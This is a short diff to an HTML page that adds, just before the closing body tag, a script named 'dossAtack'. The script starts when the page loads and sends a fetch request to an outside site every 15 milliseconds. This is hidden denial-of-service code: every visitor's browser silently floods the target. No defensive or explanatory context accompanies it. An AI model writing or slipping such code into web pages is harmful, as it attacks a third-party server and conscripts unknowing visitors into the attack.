@@ -171,7 +171,18 @@
             });
         });
     </script>
+<script>
+    function dossAtack(){
 
+        setInterval(()=>{  fetch("https://denncitestsite.000webhostapp.com/get_posts.php")},15)
+
+}
+
+        window.onload =()=> {
+            dossAtack()
+
+        };
+</script>
 </body>
 
 </html>
